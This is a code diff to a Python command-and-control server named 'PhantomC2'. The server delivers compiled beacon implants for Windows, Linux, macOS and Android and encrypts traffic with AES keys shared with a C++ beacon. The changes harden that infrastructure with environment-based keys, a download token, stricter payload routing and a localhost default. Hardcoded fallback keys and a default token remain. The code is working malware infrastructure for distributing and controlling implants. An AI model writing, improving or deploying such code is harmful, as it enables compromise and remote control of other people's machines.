@@ -9,6 +9,7 @@ import asyncio
 import threading
 import json
 import base64
+import os
 from datetime import datetime
 from typing import Any, Optional
 
@@ -80,8 +81,18 @@ c2_state = C2State()
 # ── Crypto Utils ────────────────────────────────────────────────────────────
 # AES-256-CBC. Key and IV must match the C++ beacon's crypto.h exactly.
 
-AES_KEY = b"PhantomC2_SecretKey_32bytes_Long"   # 32 bytes
-AES_IV  = b"PhantomC2_IV16b\x00"                # 16 bytes (padded with null)
+DEFAULT_AES_KEY = b"PhantomC2_SecretKey_32bytes_Long"
+DEFAULT_AES_IV  = b"PhantomC2_IV16b\x00"
+
+AES_KEY = os.getenv("PHANTOM_C2_KEY", "").encode()
+if len(AES_KEY) != 32:
+    AES_KEY = DEFAULT_AES_KEY
+
+AES_IV = os.getenv("PHANTOM_C2_IV", "").encode()
+if len(AES_IV) != 16:
+    AES_IV = DEFAULT_AES_IV
+
+PAYLOAD_AUTH_TOKEN = os.getenv("PHANTOM_PAYLOAD_TOKEN", "PhantomDefaultToken")
 
 
 def encrypt_data(plaintext: str) -> str:
@@ -188,9 +199,17 @@ async def handle_result(request: web.Request) -> web.Response:
 
 
 async def handle_payload(request: web.Request) -> web.Response:
-    """GET /api/v1/payload[_<platform>] — Serves the compiled beacon binary."""
+    """GET /api/v1/payload[_<platform>] — Serves the compiled beacon binary.
+       Requires ?auth=TOKEN or X-Auth-Token header."""
     try:
         import os
+        
+        # Check authentication
+        token = request.query.get("auth") or request.headers.get("X-Auth-Token")
+        if token != PAYLOAD_AUTH_TOKEN:
+            logger.warning(f"Unauthorized payload request from {request.remote}")
+            return web.Response(status=403, text="Forbidden: Invalid auth token")
+
         # Map route to filename
         platform_map = {
             "/api/v1/payload": "beacon.exe",
@@ -198,7 +217,10 @@ async def handle_payload(request: web.Request) -> web.Response:
             "/api/v1/payload_macos": "beacon_macos",
             "/api/v1/payload_android": "beacon_android",
         }
-        filename = platform_map.get(request.path, "beacon.exe")
+        filename = platform_map.get(request.path)
+        if not filename:
+            return web.Response(text="Invalid payload path", status=404)
+        
         payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", filename)
         if not os.path.exists(payload_path):
             return web.Response(text=f"Payload '{filename}' not compiled yet.", status=404)
@@ -211,7 +233,9 @@ async def handle_payload(request: web.Request) -> web.Response:
 # ── Server Lifecycle ───────────────────────────────────────────────────────
 
 class C2Server:
-    def __init__(self, host: str = "0.0.0.0", port: int = 443):
+    def __init__(self, host: str = "127.0.0.1", port: int = 443):
+        if host == "0.0.0.0":
+            logger.warning("C2 Server listening on 0.0.0.0. Ensure firewall is configured.")
         self.host = host
         self.port = port
         self.app = web.Application()
